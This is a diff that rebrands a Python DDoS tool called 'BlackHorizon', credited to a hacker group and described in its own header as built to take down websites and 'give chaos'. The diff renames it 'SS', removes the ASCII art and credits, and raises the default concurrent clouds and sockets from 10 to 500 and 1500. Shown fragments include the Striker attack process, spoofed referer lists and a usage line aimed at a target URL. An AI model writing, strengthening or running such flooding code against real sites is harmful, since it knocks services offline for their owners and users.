@@ -1,35 +1,4 @@
-$ cat BlackHorizon.py
 #!/usr/bin/env python
-###############################################################################
-#                     /#\                                                     #
-#                    /###\     /\                                             #
-#                   /  ###\   /##\  /\                                        #
-#                  /      #\ /####\/##\                                       #
-#                 /  /      /   # /  ##\             _       /\               #
-#               // //  /\  /    _/  /  #\ _         /#\    _/##\    /\        #
-#              // /   /  \     /   /    #\ \      _/###\_ /   ##\__/ _\       #
-#             /  \   / .. \   / /   _   { \ \   _/       / //    /    \\      #
-#     /\     /    /\  ...  \_/   / / \   } \ | /  /\  \ /  _    /  /    \ /\  #
-#  _ /  \  /// / .\  ..%:.  /... /\ . \ {:  \\   /. \     / \  /   ___   /  \ #
-# /.\ .\.\// \/... \.::::..... _/..\ ..\:|:. .  / .. \\  /.. \    /...\ /  \ \#
-#/...\.../..:.\. ..:::::::..:..... . ...\{:... / %... \\/..%. \  /./:..\__   \#
-# .:..\:..:::....:::;;;;;;::::::::.:::::.\}.....::%.:. \ .:::. \/.%:::.:..\   #
-#::::...:::;;:::::;;;;;;;;;;;;;;:::::;;::{:::::::;;;:..  .:;:... ::;;::::..   #
-#;;;;:::;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;];;;;;;;;;;::::::;;;;:.::;;;;;;;;:..#
-#;;;;;;;;;;;;;;ii;;;;;;;;;;;;;;;;;;;;;;;;[;;;;;;;;;;;;;;;;;;;;;;:;;;;;;;;;;;;;#
-#;;;;;;;;;;;;;;;;;;;iiiiiiii;;;;;;;;;;;;;;};;ii;;iiii;;;;i;;;;;;;;;;;;;;;ii;;;#
-#iiii;;;iiiiiiiiiiIIIIIIIIIIIiiiiiIiiiiii{iiIIiiiiiiiiiiiiiiii;;;;;iiiilliiiii#
-#IIIiiIIllllllIIlllIIIIlllIIIlIiiIIIIIIIIIIIIlIIIIIllIIIIIIIIiiiiiiiillIIIllII#
-#IIIiiilIIIIIIIllTIIIIllIIlIlIIITTTTlIlIlIIIlIITTTTTTTIIIIlIIllIlIlllIIIIIIITT#
-#IIIIilIIIIITTTTTTTIIIIIIIIIIIIITTTTTIIIIIIIIITTTTTTTTTTIIIIIIIIIlIIIIIIIITTTT#
-#IIIIIIIIITTTTTTTTTTTTTIIIIIIIITTTTTTTTIIIIIITTTTTTTTTTTTTTIIIIIIIIIIIIIITTTTT#
-#Black Horizon iDDoS Tool Created for takedown some websites and give chaos   #
-################################Hax Stroke#####################################
-########################youtube.com/c/HaXStroKE################################
-###########################Twitter: @HaxStroke#################################
-###################################GSH#########################################
-##################https://www.facebook.com/GhostSquadHackers/##################
-
 
 from multiprocessing import Process, Manager, Pool
 import urlparse, ssl
@@ -59,10 +28,10 @@ METHOD_RAND = 'random'
 
 JOIN_TIMEOUT=1.0
 
-DEFAULT_CLOUNDS=10
-DEFAULT_SOCKETS=10
+DEFAULT_CLOUNDS=500
+DEFAULT_SOCKETS=1500
 
-BLACKHORIZON_BANNER = 'BlackHorizon Clound Based DDoS Tool Created By Hax Stroke for GSH Members'
+SS_BANNER = 'BlackHorizon Clound Based DDoS Tool Created By Hax Stroke for GSH Members'
 
 USER_AGENT_PARTS = {
     'os': {
@@ -101,22 +70,22 @@ USER_AGENT_PARTS = {
 }
 
 ####
-# BlackHorizon Class
+# SS Class
 ####
 
-class BlackHorizon(object):
+class SS(object):
 
     # Counters
     counter = [0, 0]
     last_counter = [0, 0]
 
     # Containers
-    cloundsQueue = []                                                  ###############################
-    manager = None                                                     #~~~~Created By Hax Stroke~~~~#
-    useragents = []                                                    #~~~~~~~~~~@FollowMe~~~~~~~~~~#
-                                                                       #~~~youtube.com/c/HaXStroKE~~~#
-    # Properties                                                       #~~~~~Twitter:@HaxStroKE~~~~~~#
-    url = None                                                         ###############################
+    cloundsQueue = []                                                  
+    manager = None                                                     
+    useragents = []                                                    
+                                                                       
+    # Properties                                                       
+    url = None                                                         
 
     # Options
     nr_clounds = DEFAULT_CLOUNDS
@@ -146,7 +115,7 @@ class BlackHorizon(object):
 
         # Taunt!
         print
-        print BLACKHORIZON_BANNER
+        print SS_BANNER
         print
 
     # Do the fun!
@@ -270,14 +239,14 @@ class Striker(Process):
 
         self.referers = [
             'http://www.google.com/',
-            'http://www.bing.com/',                                               ############################
-            'http://www.baidu.com/',                                              #Pre-configured            #
-            'http://www.yandex.com/',                                             #Botnets                   #
-            'http://www.yahoo.com/',                                              #Infected's Websites       #
-            'http://www.globo.com/',                                              #Best's Shells Only        #
-            'http://www.pastebin.com/',                                           #All uploaded by Hax Stroke#
-            'https://www.nasa.gov/',                                              #From GhostSquadHackers    #
-            'https://www.facebook.com/',                                          ############################
+            'http://www.bing.com/',                                               
+            'http://www.baidu.com/',                                              
+            'http://www.yandex.com/',                                             
+            'http://www.yahoo.com/',                                              
+            'http://www.globo.com/',                                              
+            'http://www.pastebin.com/',                                           
+            'https://www.nasa.gov/',                                              
+            'https://www.facebook.com/',                                  
             'http://www.chris.com/',
             'http://www.retrojunkie.com/',
             'http://www.usatoday.com/',
@@ -544,35 +513,21 @@ class Striker(Process):
 ####
 
 def usage():
-    print BLACKHORIZON_BANNER
-    print ' USAGE: ./BlackHorizon.py http://www.target.com/ [OPTIONS]'
+    print SS_BANNER
+    print ' USAGE: ./SS.py http://www.target.com/ '
     print ' -c, --clounds Number of concurrent clounds\t(default: {0})'.format(DEFAULT_CLOUNDS)
     print ' -s, --sockets Number of concurrent sockets\t(default: {0})'.format(DEFAULT_SOCKETS)
-    print 'GhostSquadHackers page: https://www.facebook.com/GhostSquadHackers/'
+    
     print "\a"
 print \
 """
-           .          .           .     .                .       .
-  .      .      *           .       .          .                       .
-                 .       .   . *  "The horizon will be black one day...
-  .       ____     .      . .      the day don't will exist more will be night"
-         <WW>>>         .        .               .
- .   .  /WWWI; \  .       .    .  ____               .         .     .
-  *    /WWWWII; \=====;    .     /WI; \   *    .        /\_             .
-  .   /WWWWWII;..      \_  . ___/WI;:. \     .        _/M; \    .   .         .
-     /WWWWWIIIIi;..      \__/WWWIIII:.. \____ .   .  /MMI:  \   * .
- . _/WWWWWIIIi;;;:...:   ;\WWWWWWIIIII;.     \     /MMWII;   \    .  .     .
-  /WWWWWIWIiii;;;.:.. :   ;\WWWWWIII;;;::     \___/MMWIIII;   \              .
- /WWWWWIIIIiii;;::.... :   ;|WWWWWWII;;::.:      :;IMWIIIII;:   \___     *
-/WWWWWWWWWIIIIIWIIii;;::;..;\WWWWWWIII;;;:::...    ;IMIII;;     ::  \     .
-WWWWWWWWWIIIIIIIIIii;;::.;..;\WWWWWWWWIIIII;;..  :;IMIII;:::     :    \
-WWWWWWWWWWWWWIIIIIIii;;::..;..;\WWWWWWWWIIII;::; :::::::::.....::
-########################################################################XXXXXXX
-#####################################################################XXXXXXXXXX
-##################################################################XXXXXXXXXXXXX
-##############################################################XXXXXXXXXXXXXXXXX
-###########################################################XXXXXXXXXXXXXXXXXXXX
-#####################################################XXXXXXXXXXXXXXXXXXXXXXXXXX           
+     _______.     _______.   
+    /       |    /       |   
+   |   (----`   |   (----`   
+    \   \        \   \       
+.----)   |   .----)   |      
+|_______/    |_______/       
+                             
 """
 
 
